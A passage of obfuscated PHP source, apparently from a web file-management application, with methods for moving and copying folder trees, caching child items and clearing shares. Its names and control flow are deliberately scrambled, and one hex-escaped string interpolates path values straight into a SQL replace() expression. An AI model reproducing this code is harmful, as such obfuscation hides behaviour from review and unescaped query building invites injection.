$aÖÜŒŠÍÉ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b·™¿‡òÙÄ = $this->sourceInfoCache($câ©ªÉÕ‘®); $CÃæİš¢Âò = $this->sourceInfoCache($B¦‚Ú„¶Ñ–); goto aâ”Àì“; D¸ôî°»ÓÍ: if ($b·™¿‡òÙÄ[$aÖÜŒŠÍÉ[370]] != $aÖÜŒŠÍÉ[83]) { $F­»åµ§Û«[$aÖÜŒŠÍÉ[503]][] = $b·™¿‡òÙÄ[$aÖÜŒŠÍÉ[419]]; return $a‰Â‚çÌõ‰; } $Câ‡Ê½±Àˆ = array(); $b¬„ÁõæÃó = array(); goto Fó‘õ”Ê—; bğºŒ‚: $b¨¾ÓñÕŠ = $this->sourceInfo($a‰Â‚çÌõ‰); foreach ($Câ‡Ê½±Àˆ as $a½¡ğå±Òä) { $a›åŒšñ»Ú = $this->_makeItemData($a½¡ğå±Òä, $b¨¾ÓñÕŠ, $a½¡ğå±Òä[$aÖÜŒŠÍÉ[28]]); $a›åŒšñ»Ú[$aÖÜŒŠÍÉ[461]] = $a½¡ğå±Òä[$aÖÜŒŠÍÉ[461]]; $b¬„ÁõæÃó[] = $a›åŒšñ»Ú; } $this->chunkEventSet($aÖÜŒŠÍÉ[513], array($aÖÜŒŠÍÉ[514], $fÎ¤–ÔÀ, $D©›¹ºÙˆ)); goto F çÂ¯¤¨«; aŞØÖë½É“: foreach ($aõÁ¤¿¸„ as $a½¡ğå±Òä) { $cÂİ™ùéŒì = $a½¡ğå±Òä[$aÖÜŒŠÍÉ[369]]; $C”Ë„—Ì¯Š = $this->_childrenMatch($c‚¡½©Ë„, $a½¡ğå±Òä, $b¨¾ÓñÕŠ); $b¤æÑ—å–[] = array($aÖÜŒŠÍÉ[369], $cÂİ™ùéŒì, $aÖÜŒŠÍÉ[463], $C”Ë„—Ì¯Š[$aÖÜŒŠÍÉ[463]]); $Aƒƒ£õö÷÷[] = array($aÖÜŒŠÍÉ[369], $cÂİ™ùéŒì, $aÖÜŒŠÍÉ[461], $C”Ë„—Ì¯Š[$aÖÜŒŠÍÉ[461]]); $this->_copyApplyMeta($a½¡ğå±Òä, $F­»åµ§Û«); if ($a½¡ğå±Òä[$aÖÜŒŠÍÉ[370]] != $aÖÜŒŠÍÉ[83]) { $F­»åµ§Û«[$aÖÜŒŠÍÉ[503]][] = $a½¡ğå±Òä[$aÖÜŒŠÍÉ[419]]; } } $this->chunkEventSet($aÖÜŒŠÍÉ[515], array($aÖÜŒŠÍÉ[516], $fÎ¤–ÔÀ, $D©›¹ºÙˆ)); $this->saveAll($b¤æÑ—å–); goto fÊ‹åÖ¼Óå; Fó‘õ”Ê—: $this->_childrenListAll($câ©ªÉÕ‘®, $Câ‡Ê½±Àˆ); $D©›¹ºÙˆ = count($Câ‡Ê½±Àˆ); if ($D©›¹ºÙˆ == 0) { return $a‰Â‚çÌõ‰; } goto bğºŒ‚; F çÂ¯¤¨«: $this->addAll($b¬„ÁõæÃó, array(), !1); $aõÁ¤¿¸„ = $this->where(array($aÖÜŒŠÍÉ[463] => $a‰Â‚çÌõ‰))->select(); $c‚¡½©Ë„ = $this->_childrenMakeRelation($Câ‡Ê½±Àˆ, $aõÁ¤¿¸„); goto cßÍì¶‰¡; Bã×”Ÿáºê: $a‰Â‚çÌõ‰ = $this->add($fÎ¤–ÔÀ); $bÀ–ŸÓ‡ŠÕ = array($aÖÜŒŠÍÉ[369] => $a‰Â‚çÌõ‰, $aÖÜŒŠÍÉ[28] => $bÙ¸Ï™ˆ); $this->_copyApplyMeta($bÀ–ŸÓ‡ŠÕ, $F­»åµ§Û«); goto D¸ôî°»ÓÍ; dğë£ÓóáÌ: } private function _childrenMakeRelation($B”¦¶Ã®ë, $a‹î¹Ï”Ê) { $b½ğİÎ½¼£ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a¼İ»ÆÍ Ü = array(); $b³ñğîìÃ¸ = array(); foreach ($B”¦¶Ã®ë as $aŠÀˆô«ñµ) { $dÆéó¨ÜÇ„ = $aŠÀˆô«ñµ[$b½ğİÎ½¼£[28]] . $b½ğİÎ½¼£[8] . $aŠÀˆô«ñµ[$b½ğİÎ½¼£[461]]; $a¼İ»ÆÍ Ü[$dÆéó¨ÜÇ„] = $aŠÀˆô«ñµ[$b½ğİÎ½¼£[369]]; } foreach ($a‹î¹Ï”Ê as $aŠÀˆô«ñµ) { $dÆéó¨ÜÇ„ = $aŠÀˆô«ñµ[$b½ğİÎ½¼£[28]] . $b½ğİÎ½¼£[8] . $aŠÀˆô«ñµ[$b½ğİÎ½¼£[461]]; $Cášç„‘ = $a¼İ»ÆÍ Ü[$dÆéó¨ÜÇ„]; $b³ñğîìÃ¸[$Cášç„‘] = $aŠÀˆô«ñµ[$b½ğİÎ½¼£[369]]; } return $b³ñğîìÃ¸; } private function _childrenMatch($dÊ«­³Ã™¤, $AˆŸ×Í¹ë, $a¾êÑ…›Ÿá) { goto Eã‹êò­“; fö‘Œã·°: foreach ($a  § Ø as $aè¼…†»”À) { if (isset($dÊ«­³Ã™¤[$aè¼…†»”À])) { $f¤“šÈ¨ .= $dÊ«­³Ã™¤[$aè¼…†»”À] . $B÷‘ê‘…Œë[519]; } } $f¤“šÈ¨ = rtrim($f¤“šÈ¨, $B÷‘ê‘…Œë[47]) . $B÷‘ê‘…Œë[47]; $bÙÜ¬ìÒœ = $this->parentLevelArray($f¤“šÈ¨); goto b§‚¿‡; Eã‹êò­“: $B÷‘ê‘…Œë =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f¤“šÈ¨ = $a¾êÑ…›Ÿá[$B÷‘ê‘…Œë[461]]; $a  § Ø = $this->parentLevelArray($AˆŸ×Í¹ë[$B÷‘ê‘…Œë[461]]); goto fö‘Œã·°; b§‚¿‡: $C‘Ê‘åÖˆ = $bÙÜ¬ìÒœ[count($bÙÜ¬ìÒœ) - 1]; return array($B÷‘ê‘…Œë[463] => $C‘Ê‘åÖˆ, $B÷‘ê‘…Œë[461] => $f¤“šÈ¨); goto d”Ò•šò•»; d”Ò•šò•»: } private function _makeItemData($d›ñ£Ó”ÌÄ, $dºˆè…ÀÜ›, $aœ‚ì¹ï³è) { $Dø»­ÔÊò =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B•šÛÙ¼¯¤ = array($Dø»­ÔÊò[520] => $d›ñ£Ó”ÌÄ[$Dø»­ÔÊò[370]], $Dø»­ÔÊò[386] => $aœ‚ì¹ï³è, $Dø»­ÔÊò[521] => $d›ñ£Ó”ÌÄ[$Dø»­ÔÊò[372]], $Dø»­ÔÊò[420] => $d›ñ£Ó”ÌÄ[$Dø»­ÔÊò[419]], $Dø»­ÔÊò[522] => $d›ñ£Ó”ÌÄ[$Dø»­ÔÊò[77]], $Dø»­ÔÊò[523] => $dºˆè…ÀÜ›[$Dø»­ÔÊò[371]], $Dø»­ÔÊò[524] => $dºˆè…ÀÜ›[$Dø»­ÔÊò[458]], $Dø»­ÔÊò[525] => USER_ID, $Dø»­ÔÊò[526] => USER_ID, $Dø»­ÔÊò[368] => $dºˆè…ÀÜ›[$Dø»­ÔÊò[369]], $Dø»­ÔÊò[527] => $dºˆè…ÀÜ›[$Dø»­ÔÊò[461]] . $dºˆè…ÀÜ›[$Dø»­ÔÊò[369]] . $Dø»­ÔÊò[47], $Dø»­ÔÊò[396] => 0, $Dø»­ÔÊò[528] => $Dø»­ÔÊò[33]); return $B•šÛÙ¼¯¤; } private function _copyApplyMeta($câ‹¬Œ‘ä, &$F½¸º©¤±ï) { $cŞİ­ŞÁİ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f²­°˜ò³ = $câ‹¬Œ‘ä[$cŞİ­ŞÁİ[369]]; $E†‰©ğ¯ = $câ‹¬Œ‘ä[$cŞİ­ŞÁİ[28]]; if (!isset($câ‹¬Œ‘ä[$cŞİ­ŞÁİ[529]]) || !$câ‹¬Œ‘ä[$cŞİ­ŞÁİ[529]] || $câ‹¬Œ‘ä[$cŞİ­ŞÁİ[529]] == $cŞİ­ŞÁİ[470]) { $F½¸º©¤±ï[$cŞİ­ŞÁİ[505]][] = array($cŞİ­ŞÁİ[369], $f²­°˜ò³, $cŞİ­ŞÁİ[529], short_id($f²­°˜ò³)); } if (Input::check($E†‰©ğ¯, $cŞİ­ŞÁİ[530])) { $F½¸º©¤±ï[$cŞİ­ŞÁİ[504]][] = array($cŞİ­ŞÁİ[369] => $f²­°˜ò³, $cŞİ­ŞÁİ[89] => $cŞİ­ŞÁİ[416], $cŞİ­ŞÁİ[359] => str_replace($cŞİ­ŞÁİ[50], $cŞİ­ŞÁİ[33], Pinyin::encode($E†‰©ğ¯))); $F½¸º©¤±ï[$cŞİ­ŞÁİ[504]][] = array($cŞİ­ŞÁİ[369] => $f²­°˜ò³, $cŞİ­ŞÁİ[89] => $cŞİ­ŞÁİ[415], $cŞİ­ŞÁİ[359] => Pinyin::encode($E†‰©ğ¯, $cŞİ­ŞÁİ[531])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($fÄ…¦˜¼¢) { goto f÷’Ìİ™™; CçÂñ¸ìÚ®: $cÒ½š¶òÊá = array_to_keyvalue($cÒ½š¶òÊá, $c²´×Ñ¹Šœ[369]); foreach ($cÒ½š¶òÊá as $Cøƒ—Èåâ) { $Eè’ñ’æŞÆ = $Cøƒ—Èåâ[$c²´×Ñ¹Šœ[463]]; $fÄ…¦˜¼¢ = $Cøƒ—Èåâ[$c²´×Ñ¹Šœ[369]]; if (!isset($this->_childrenListCache[$fÄ…¦˜¼¢]) && $Cøƒ—Èåâ[$c²´×Ñ¹Šœ[370]] == $c²´×Ñ¹Šœ[83]) { $this->_childrenListCache[$fÄ…¦˜¼¢] = array(); } if (!isset($this->_childrenListCache[$Eè’ñ’æŞÆ])) { $this->_childrenListCache[$Eè’ñ’æŞÆ] = array(); } $this->_childrenListCache[$Eè’ñ’æŞÆ][$fÄ…¦˜¼¢] = $Cøƒ—Èåâ; $this->_childrenItemCache[$fÄ…¦˜¼¢] = $Cøƒ—Èåâ; } goto EÃÏÎŠÁÔİ; f÷’Ìİ™™: $c²´×Ñ¹Šœ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e®¦ŒŒ–‘ = $this->sourceInfo($fÄ…¦˜¼¢); $cøÑÑŠ¸¶ß = $c²´×Ñ¹Šœ[532]; goto E–¥‘ÈÍš±; E–¥‘ÈÍš±: $F§ğÆ«í» = array($c²´×Ñ¹Šœ[461] => array($c²´×Ñ¹Šœ[485], $e®¦ŒŒ–‘[$c²´×Ñ¹Šœ[461]] . $fÄ…¦˜¼¢ . $c²´×Ñ¹Šœ[486]), $c²´×Ñ¹Šœ[397] => $this->targetIsDelete); $cÒ½š¶òÊá = $this->field($cøÑÑŠ¸¶ß)->where($F§ğÆ«í»)->select(); if (!$cÒ½š¶òÊá) { return; } goto CçÂñ¸ìÚ®; EÃÏÎŠÁÔİ: } private function _childrenListAll($D”˜½‘ì—, &$D“¬¨©›) { $féè¼¹‘„Ê =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!isset($this->_childrenListCache[$D”˜½‘ì—])) { return; } $bïƒŒÌšÌ = $this->_childrenListCache[$D”˜½‘ì—]; foreach ($bïƒŒÌšÌ as $cƒéº“¾ => $DÙŒ¯ï¦„—) { $D“¬¨©›[$cƒéº“¾] = $DÙŒ¯ï¦„—; if ($DÙŒ¯ï¦„—[$féè¼¹‘„Ê[370]] == $féè¼¹‘„Ê[83]) { $this->_childrenListAll($cƒéº“¾, $D“¬¨©›); } } } private function sourceInfoCache($dÈ™ë“ÖÑˆ) { if (isset($this->_childrenItemCache[$dÈ™ë“ÖÑˆ])) { return $this->_childrenItemCache[$dÈ™ë“ÖÑˆ]; } return $this->sourceInfo($dÈ™ë“ÖÑˆ); } private function _childrenList($bÁ¢‘ø‡Œ·) { if (isset($this->_childrenListCache[$bÁ¢‘ø‡Œ·])) { return $this->_childrenListCache[$bÁ¢‘ø‡Œ·]; } return $this->_childrenListSelect($bÁ¢‘ø‡Œ·); } private function _childrenListSelect($F»ñ›íéƒ) { goto A™ÕèÈ¹’…; Bƒó¯Â”Šï: $Aç‹¤³’Ì = $Aç‹¤³’Ì ? $Aç‹¤³’Ì : array(); $bø˜‘Ëğœç = array_to_keyvalue($Aç‹¤³’Ì, $Eµ¦Ê¦ä®[369]); $this->_childrenListCache[$F»ñ›íéƒ] = $bø˜‘Ëğœç; goto E‚³ÜŒ–ˆĞ; A™ÕèÈ¹’…: $Eµ¦Ê¦ä® =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CŸÙùˆÃà = array($Eµ¦Ê¦ä®[463] => $F»ñ›íéƒ, $Eµ¦Ê¦ä®[397] => $this->targetIsDelete); $Aç‹¤³’Ì = $this->where($CŸÙùˆÃà)->select(); goto Bƒó¯Â”Šï; E‚³ÜŒ–ˆĞ: foreach ($bø˜‘Ëğœç as $F»ñ›íéƒ => $A—ÊÙÆİ©Ö) { $this->_childrenItemCache[$F»ñ›íéƒ] = $A—ÊÙÆİ©Ö; } return $bø˜‘Ëğœç; goto b‚—îåİ‚Ò; b‚—îåİ‚Ò: } private function fileNameExistCache($dòø‚Ú×œ¦, $b„˜–ÑµÛå) { $CŸğ½ù‚Şà =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b„˜–ÑµÛå = strtolower($b„˜–ÑµÛå); $e”‘¶í¤Ã½ = $this->_childrenList($dòø‚Ú×œ¦); foreach ($e”‘¶í¤Ã½ as $c©éëÂ›Í¤) { if ($b„˜–ÑµÛå == strtolower($c©éëÂ›Í¤[$CŸğ½ù‚Şà[28]])) { return $c©éëÂ›Í¤[$CŸğ½ù‚Şà[369]]; } } return !1; } private function fileNameAutoCache($F¯÷’À²Õç, $CóÍ¢ìÇ‹Ÿ, $EšÑÃÕ„í¢, $B°°ÚÄ£ÀŒ) { $EÌŞêÒ†šç =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a¥Í“è˜‹ = $this->_childrenList($F¯÷’À²Õç); $Aí›´Ä×àÕ = array_to_keyvalue($a¥Í“è˜‹, $EÌŞêÒ†šç[33], $EÌŞêÒ†šç[28]); return $this->fileNameAutoGet($Aí›´Ä×àÕ, $CóÍ¢ìÇ‹Ÿ, $EšÑÃÕ„í¢, $B°°ÚÄ£ÀŒ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($e÷ˆ’Ç¤¤Ñ, $EÙ¦º¹®ˆº, $bÜÅêƒçğ = REPEAT_REPLACE, $A¿šÇšñ… = '') { goto F–Ã¯•˜ğâ; Bäœ¸†Àå: if ($aßÒ¸å‚®À[$Bñœ„Ê½Òß[463]] == $EÙ¦º¹®ˆº && $A¿šÇšñ… != $aßÒ¸å‚®À[$Bñœ„Ê½Òß[28]]) { $CÕ“¢éÙä– = $this->fileNameExist($EÙ¦º¹®ˆº, $A¿šÇšñ…); if ($CÕ“¢éÙä– && $aßÒ¸å‚®À[$Bñœ„Ê½Òß[370]] == $Bñœ„Ê½Òß[470]) { goto eÔ—ŒÑµ„; eÔ—ŒÑµ„: $c›­¨°‹È© = $this->sourceInfo($CÕ“¢éÙä–); $A‰‹ÔÀÙî° = $this->fileHistory($c›­¨°‹È©, $aßÒ¸å‚®À[$Bñœ„Ê½Òß[419]], $aßÒ¸å‚®À[$Bñœ„Ê½Òß[77]]); if (!$A‰‹ÔÀÙî°) { Model($Bñœ„Ê½Òß[422])->remove($aßÒ¸å‚®À[$Bñœ„Ê½Òß[419]]); } goto BˆÄëÒ–®Æ; A–µŠÛÈë: return $CÕ“¢éÙä–; goto B¢ç’‹‘êÍ; BˆÄëÒ–®Æ: $this->removeNow($e÷ˆ’Ç¤¤Ñ, !1); $this->folderSizeReset($EÙ¦º¹®ˆº); Hook::trigger($Bñœ„Ê½Òß[534], $DÜÍ¢‚¾óœ); goto A–µŠÛÈë; B¢ç’‹‘êÍ: } } $DÂ®ˆÙ˜³Í = $A¿šÇšñ… ? $A¿šÇšñ… : $aßÒ¸å‚®À[$Bñœ„Ê½Òß[28]]; $this->lockMoveStart($e÷ˆ’Ç¤¤Ñ); goto B­É„ÄÇ¢; aÕø‰ÄÒã„: $this->updateModifyTime($dâãÛŒ½˜); Model($Bñœ„Ê½Òß[507])->eventMove($e÷ˆ’Ç¤¤Ñ, $aßÒ¸å‚®À[$Bñœ„Ê½Òß[463]], $EÙ¦º¹®ˆº); Hook::trigger($Bñœ„Ê½Òß[534], $DÜÍ¢‚¾óœ); goto añİ›Œ„­ª; E‘ô¶Ó©‘: if (!$aßÒ¸å‚®À || !$a›—Îà¶ ½ || $a›—Îà¶ ½[$Bñœ„Ê½Òß[370]] != $Bñœ„Ê½Òß[83]) { return !1; } Hook::trigger($Bñœ„Ê½Òß[533], $DÜÍ¢‚¾óœ); $this->targetIsDelete = intval($aßÒ¸å‚®À[$Bñœ„Ê½Òß[397]]); goto Bäœ¸†Àå; dè ¯â¶: $cÓ÷Ø„»ì = $this->fileNameExistCache($EÙ¦º¹®ˆº, $aßÒ¸å‚®À[$Bñœ„Ê½Òß[28]]); $D«•±Ë¤ = $this->_move($e÷ˆ’Ç¤¤Ñ, $EÙ¦º¹®ˆº, $bÜÅêƒçğ, $FÌùŠ¼Åİ™, $A¿šÇšñ…); $this->sourceCacheClear(); goto Cª©‹°İˆ; C¥âœÜ´¯Ò: if ($aßÒ¸å‚®À[$Bñœ„Ê½Òß[463]] == $a›—Îà¶ ½[$Bñœ„Ê½Òß[369]]) { if ($aßÒ¸å‚®À[$Bñœ„Ê½Òß[397]] == $Bñœ„Ê½Òß[83]) { Model($Bñœ„Ê½Òß[395])->restore(array($e÷ˆ’Ç¤¤Ñ)); } return $e÷ˆ’Ç¤¤Ñ; } $DÜÍ¢‚¾óœ = $this->pathInfoMore($e÷ˆ’Ç¤¤Ñ); if ($this->isParentOf($e÷ˆ’Ç¤¤Ñ, $EÙ¦º¹®ˆº)) { return !1; } goto E‘ô¶Ó©‘; fÆ…îåîÂˆ: $this->lockMoveEnd($e÷ˆ’Ç¤¤Ñ); $this->lockWriteEnd($EÙ¦º¹®ˆº, $DÂ®ˆÙ˜³Í); $this->folderSizeReset($aßÒ¸å‚®À[$Bñœ„Ê½Òß[463]]); goto dÉİ­Å®ğ; añİ›Œ„­ª: return $D«•±Ë¤; goto Eö‘¡½æ½†; F–Ã¯•˜ğâ: $Bñœ„Ê½Òß =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aßÒ¸å‚®À = $this->sourceInfo($e÷ˆ’Ç¤¤Ñ); $a›—Îà¶ ½ = $this->sourceInfo($EÙ¦º¹®ˆº); goto C¥âœÜ´¯Ò; B­É„ÄÇ¢: $this->lockWriteStart($EÙ¦º¹®ˆº, $DÂ®ˆÙ˜³Í); $FÌùŠ¼Åİ™ = array($Bñœ„Ê½Òß[503] => array(), $Bñœ„Ê½Òß[535] => !1); $this->clearShare($e÷ˆ’Ç¤¤Ñ, $EÙ¦º¹®ˆº); goto dè ¯â¶; dÉİ­Å®ğ: $this->folderSizeReset($EÙ¦º¹®ˆº); $dâãÛŒ½˜ = array($aßÒ¸å‚®À[$Bñœ„Ê½Òß[463]], $EÙ¦º¹®ˆº); if ($aßÒ¸å‚®À[$Bñœ„Ê½Òß[370]] == $Bñœ„Ê½Òß[83]) { $dâãÛŒ½˜[] = $e÷ˆ’Ç¤¤Ñ; } goto aÕø‰ÄÒã„; Cª©‹°İˆ: if ($aßÒ¸å‚®À[$Bñœ„Ê½Òß[370]] == $Bñœ„Ê½Òß[83] && $cÓ÷Ø„»ì) { $this->folderSizeResetChildren($D«•±Ë¤); } Model($Bñœ„Ê½Òß[167])->linkAdd($FÌùŠ¼Åİ™[$Bñœ„Ê½Òß[503]]); if ($cÓ÷Ø„»ì && $FÌùŠ¼Åİ™[$Bñœ„Ê½Òß[535]]) { $this->removeNow($e÷ˆ’Ç¤¤Ñ, !1); } goto fÆ…îåîÂˆ; Eö‘¡½æ½†: } private function _move($b´­ãÀÕ£Ë, $d˜œáæ¹Ø¥, $dùÆµÑºÆ‘, &$B‰‰ßø°Îô, $A™¸øíÃÀ” = '') { goto AåÄèÜø‚“; CØ¢„Õƒî¯: $c½µ„¤†ª = $A™¸øíÃÀ” ? $A™¸øíÃÀ” : $b—ŠÎ–Ï¢‚[$C…çÙ„ì¦£[28]]; $bøª³µÜÓ… = $this->fileNameExistCache($d˜œáæ¹Ø¥, $c½µ„¤†ª); $this->lockMoveStart($b´­ãÀÕ£Ë); goto dºƒÂŠÓÌˆ; aÜÃ–óèó: return $d”º¼å³ˆ; goto bØÈÏ½—äí; AåÄèÜø‚“: $C…çÙ„ì¦£ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b—ŠÎ–Ï¢‚ = $this->sourceInfo($b´­ãÀÕ£Ë); $B Ûùİ„ã¥ = $b—ŠÎ–Ï¢‚[$C…çÙ„ì¦£[370]] == $C…çÙ„ì¦£[83]; goto CØ¢„Õƒî¯; fº¤Œ«Ô´: $déÁî¯½à« = !1; if ($B Ûùİ„ã¥) { if ($dùÆµÑºÆ‘ == REPEAT_RENAME_FOLDER) { $c½µ„¤†ª = $this->fileNameAuto($d˜œáæ¹Ø¥, $c½µ„¤†ª, $dùÆµÑºÆ‘, $B Ûùİ„ã¥); $d”º¼å³ˆ = $this->_moveForce($b´­ãÀÕ£Ë, $d˜œáæ¹Ø¥, $c½µ„¤†ª); } else { if ($dùÆµÑºÆ‘ == REPEAT_RENAME_FOLDER) { $dùÆµÑºÆ‘ = REPEAT_RENAME; } $eˆõÃ²Ãñ‰ = $this->_childrenListSelect($b´­ãÀÕ£Ë); foreach ($eˆõÃ²Ãñ‰ as $Ašàˆ‡²µ) { $this->_move($Ašàˆ‡²µ[$C…çÙ„ì¦£[369]], $bøª³µÜÓ…, $dùÆµÑºÆ‘, $B‰‰ßø°Îô); } $déÁî¯½à« = !0; } } else { if ($dùÆµÑºÆ‘ == REPEAT_SKIP) { $déÁî¯½à« = !0; } else { if ($dùÆµÑºÆ‘ == REPEAT_RENAME || $dùÆµÑºÆ‘ == REPEAT_RENAME_FOLDER) { $c½µ„¤†ª = $this->fileNameAuto($d˜œáæ¹Ø¥, $c½µ„¤†ª, $dùÆµÑºÆ‘, $B Ûùİ„ã¥); $d”º¼å³ˆ = $this->_moveForce($b´­ãÀÕ£Ë, $d˜œáæ¹Ø¥, $c½µ„¤†ª); } else { if ($dùÆµÑºÆ‘ == REPEAT_REPLACE) { $aÉ—”³‡®Ü = $this->sourceInfoCache($bøª³µÜÓ…); $d˜ê×äÂĞŒ = $this->fileHistory($aÉ—”³‡®Ü, $b—ŠÎ–Ï¢‚[$C…çÙ„ì¦£[419]], $b—ŠÎ–Ï¢‚[$C…çÙ„ì¦£[77]]); if ($d˜ê×äÂĞŒ) { $B‰‰ßø°Îô[$C…çÙ„ì¦£[503]][] = $b—ŠÎ–Ï¢‚[$C…çÙ„ì¦£[419]]; } else { $déÁî¯½à« = !0; } } } } } if ($déÁî¯½à« && !$B‰‰ßø°Îô[$C…çÙ„ì¦£[535]]) { $B‰‰ßø°Îô[$C…çÙ„ì¦£[535]] = !0; } goto aÜÃ–óèó; dºƒÂŠÓÌˆ: $this->lockWriteStart($d˜œáæ¹Ø¥, $c½µ„¤†ª); if (!$bøª³µÜÓ…) { return $this->_moveForce($b´­ãÀÕ£Ë, $d˜œáæ¹Ø¥, $c½µ„¤†ª); } $d”º¼å³ˆ = $bøª³µÜÓ…; goto fº¤Œ«Ô´; bØÈÏ½—äí: } private function _moveForce($e›„¤ÈËŠ­, $BÈ±èÚ§ø‘, $FßÛäí¢êñ) { goto cÚìÎ’; f·÷‚Èãø·: $d´Ç©¡Õ„Î = $b‹Õ¯Òƒ¡÷[$E·Å†‡‰£¾[370]] == $E·Å†‡‰£¾[83]; $FÑÁÆ°¶ãº = array($E·Å†‡‰£¾[368] => $d•æäÜÂœ²[$E·Å†‡‰£¾[369]], $E·Å†‡‰£¾[527] => $d•æäÜÂœ²[$E·Å†‡‰£¾[461]] . $d•æäÜÂœ²[$E·Å†‡‰£¾[369]] . $E·Å†‡‰£¾[47], $E·Å†‡‰£¾[523] => $d•æäÜÂœ²[$E·Å†‡‰£¾[371]], $E·Å†‡‰£¾[524] => $d•æäÜÂœ²[$E·Å†‡‰£¾[458]], $E·Å†‡‰£¾[526] => USER_ID, $E·Å†‡‰£¾[386] => $FßÛäí¢êñ); $Aò‘ßİ˜« = $b‹Õ¯Òƒ¡÷[$E·Å†‡‰£¾[371]] == SourceModel::TYPE_GROUP && $d•æäÜÂœ²[$E·Å†‡‰£¾[371]] == SourceModel::TYPE_GROUP && $b‹Õ¯Òƒ¡÷[$E·Å†‡‰£¾[458]] == $d•æäÜÂœ²[$E·Å†‡‰£¾[458]]; goto aĞ‡ëœ¡–Ã; cÚìÎ’: $E·Å†‡‰£¾ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b‹Õ¯Òƒ¡÷ = $this->sourceInfo($e›„¤ÈËŠ­); $d•æäÜÂœ² = $this->sourceInfo($BÈ±èÚ§ø‘); goto f·÷‚Èãø·; fíƒïè£Ù‚: if ($d´Ç©¡Õ„Î) { $eˆ³Èß‡Ò¥ = array($E·Å†‡‰£¾[527] => array($E·Å†‡‰£¾[485], $b‹Õ¯Òƒ¡÷[$E·Å†‡‰£¾[461]] . $b‹Õ¯Òƒ¡÷[$E·Å†‡‰£¾[369]] . $E·Å†‡‰£¾[486])); $Cñ½ˆ¶±Æ = $b‹Õ¯Òƒ¡÷[$E·Å†‡‰£¾[461]] . $b‹Õ¯Òƒ¡÷[$E·Å†‡‰£¾[369]] . $E·Å†‡‰£¾[47]; $Dáß†¾ì†å = $d•æäÜÂœ²[$E·Å†‡‰£¾[461]] . $d•æäÜÂœ²[$E·Å†‡‰£¾[369]] . $E·Å†‡‰£¾[47] . $b‹Õ¯Òƒ¡÷[$E·Å†‡‰£¾[369]] . $E·Å†‡‰£¾[47]; $dÂÃØì¥¹ = array($E·Å†‡‰£¾[527] => array($E·Å†‡‰£¾[536], "\x72\x65\x70\x6c\141\143\145\50\160\x61\162\145\x6e\x74\114\x65\x76\x65\x6c\54\x27{$Cñ½ˆ¶±Æ}\x27\x2c\x27{$Dáß†¾ì†å}\x27\x29"), $E·Å†‡‰£¾[523] => $d•æäÜÂœ²[$E·Å†‡‰£¾[371]], $E·Å†‡‰£¾[524] => $d•æäÜÂœ²[$E·Å†‡‰£¾[458]]); if ($BÙ¦ˆËËĞ) { $dÂÃØì¥¹[$E·Å†‡‰£¾[396]] = 0; } $this->where($eˆ³Èß‡Ò¥)->data($dÂÃØì¥¹)->save(); } $this->where(array($E·Å†‡‰£¾[383] => $e›„¤ÈËŠ­))->data($FÑÁÆ°¶ãº)->save(); return $e›„¤ÈËŠ­; goto b³ù×šÜˆ; aĞ‡ëœ¡–Ã: if (!$Aò‘ßİ˜«) { Model($E·Å†‡‰£¾[456])->authClear($e›„¤ÈËŠ­); } $BÙ¦ˆËËĞ = $b‹Õ¯Òƒ¡÷[$E·Å†‡‰£¾[397]] == $E·Å†‡‰£¾[83] && $d•æäÜÂœ²[$E·Å†‡‰£¾[397]] != $E·Å†‡‰£¾[83]; if ($BÙ¦ˆËËĞ) { $FÑÁÆ°¶ãº[$E·Å†‡‰£¾[396]] = 0; } goto fíƒïè£Ù‚; b³ù×šÜˆ: } private function clearShare($d„…óôõ†ö, $e…ÇõÄÉ²¾) { goto d…ÒÆî†…; c¬´´Œ©àö: if ($CŞñ–ë¢è°[$eí£Øˆ÷°Œ[458]] == $c¿ÏÊáòÃİ[$eí£Øˆ÷°Œ[458]] && $CŞñ–ë¢è°[$eí£Øˆ÷°Œ[371]] == $eí£Øˆ÷°Œ[537]) { return; } $C±ãÆˆ†¨ = array($eí£Øˆ÷°Œ[461] => array($eí£Øˆ÷°Œ[485], $CŞñ–ë¢è°[$eí£Øˆ÷°Œ[461]] . $d„…óôõ†ö . $eí£Øˆ÷°Œ[486])); $B“¨¾ğÒ«å = $this->field($eí£Øˆ÷°Œ[383])->where($C±ãÆˆ†¨)->getField($eí£Øˆ÷°Œ[369], !0); goto c‰¶Ä‹´÷ù; d…ÒÆî†…: $eí£Øˆ÷°Œ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CŞñ–ë¢è° = $this->sourceInfo($d„…óôõ†ö); $c¿ÏÊáòÃİ = $this->sourceInfo($e…ÇõÄÉ²¾); goto c¬´´Œ©àö; D‰çßº‡Ó: if (!$AÒŒ«ùôóŸ) { return; } $AÒŒ«ùôóŸ = array_to_keyvalue($AÒŒ«ùôóŸ, $eí£Øˆ÷°Œ[33], $eí£Øˆ÷°Œ[441]); $C±ãÆˆ†¨ = array($eí£Øˆ÷°Œ[441] => array($eí£Øˆ÷°Œ[7], $AÒŒ«ùôóŸ)); goto Bë×â–’±; c‰¶Ä‹´÷ù: if (!$B“¨¾ğÒ«å) { return; } $C±ãÆˆ†¨ = array($eí£Øˆ÷°Œ[369] => array($eí£Øˆ÷°Œ[7], $B“¨¾ğÒ«å), $eí£Øˆ÷°Œ[448] => 1); $AÒŒ«ùôóŸ = Model($eí£Øˆ÷°Œ[538])->field($eí£Øˆ÷°Œ[441])->where($C±ãÆˆ†¨)->select(); goto D‰çßº‡Ó; Bë×â–’±: Model($eí£Øˆ÷°Œ[538])->where($C±ãÆˆ†¨)->save(array($eí£Øˆ÷°Œ[448] => 0)); Model($eí£Øˆ÷°Œ[539])->where($C±ãÆˆ†¨)->delete(); goto E ö£æºå; E ö£æºå: } public function copyFolderFromIO($AÚ”šƒéÔ, $aò¡©˜ ­, 